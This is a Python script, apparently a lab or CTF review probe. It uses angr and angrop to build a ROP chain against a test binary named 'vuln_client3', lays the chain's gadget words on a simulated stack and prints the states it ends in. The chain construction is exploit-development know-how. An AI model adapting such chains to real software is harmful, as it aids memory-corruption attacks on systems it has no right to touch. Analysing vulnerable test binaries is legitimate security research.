"""
V2 review probe: inspect all final states of the concrete chain run.
"""
import os, logging as _logging
import angr, angrop  # noqa
os.chdir(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
for name in ("angrop", "angr"):
    _logging.getLogger(name).setLevel(_logging.ERROR)
from angr import claripy

p = angr.Project("bins/vuln_client3", auto_load_libs=False)
r = p.analyses.ROP()
r.load_gadgets("gadgets.cache")
c1 = r.func_call(0x4011C6, [0x41414141, 0x42424242, 0xC0DE], needs_return=True)

WORDS = [0x40152a, 0, 1, 0x41414141, 0x42424242, 0xc0de, 0x403e10, 0x401510,
         0, 0, 0, 0, 0, 0, 0, 0x50000100]
STACK_BASE = 0x70000000
CALLEE = 0x50000800
s = p.factory.blank_state(add_options={angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
                                       angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS})
s.memory.map_region(0x50000000, 0x2000, 'rwx')
s.memory.store(0x50000800, b"\x90\xc3")
s.memory.store(0x403e10, claripy.BVV(CALLEE, 64), endness=p.arch.memory_endness)
for i, w in enumerate(WORDS):
    s.memory.store(STACK_BASE + i*8, claripy.BVV(w, 64), endness=p.arch.memory_endness)
s.regs.sp = STACK_BASE + 8
s.regs.pc = WORDS[0]
simgr = p.factory.simgr(s, save_unconstrained=True)
for _ in range(1000):
    if not simgr.active:
        break
    simgr.step()

print("[*] final: active=%d unconstrained=%d errored=%d deadended=%d"
      % (len(simgr.active), len(simgr.unconstrained), len(simgr.errored), len(simgr.deadended)))
for name, sts in [("active", simgr.active), ("uncon", simgr.unconstrained),
                  ("deadend", simgr.deadended)]:
    for i, st in enumerate(sts):
        print("   %s[%d] pc=%#x  [0x50000f80]=%s" % (name, i, st.solver.eval(st.regs.pc),
              st.memory.load(0x50000f80, 8, endness=p.arch.memory_endness)))
for i, e in enumerate(simgr.errored):
    st = e.state
    try:
        pc = st.solver.eval(st.regs.pc)
    except Exception:
        pc = st.regs.pc
    v = st.memory.load(0x50000f80, 8, endness=p.arch.memory_endness)
    print("   errored[%d] err=%r pc=%r [0x50000f80]=%s" % (i, e.error, pc, v))
